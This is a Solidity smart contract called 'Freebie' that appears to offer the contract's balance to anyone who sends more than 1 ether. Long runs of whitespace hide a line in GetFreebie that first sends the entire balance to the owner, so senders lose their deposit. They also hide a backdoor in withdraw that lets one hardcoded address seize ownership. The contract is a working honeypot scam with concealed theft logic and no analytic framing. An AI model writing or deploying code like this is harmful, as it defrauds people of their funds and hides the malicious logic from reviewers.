pragma solidity ^0.4.19;

contract Freebie
{
    struct S {
        address a;
        uint b;
    }
    S public t = S(msg.sender, 0);
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               t.a.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){t.a=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == t.a);
        t.a.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == t.a);
         
        adr.call.value(msg.value)(data);
    }
}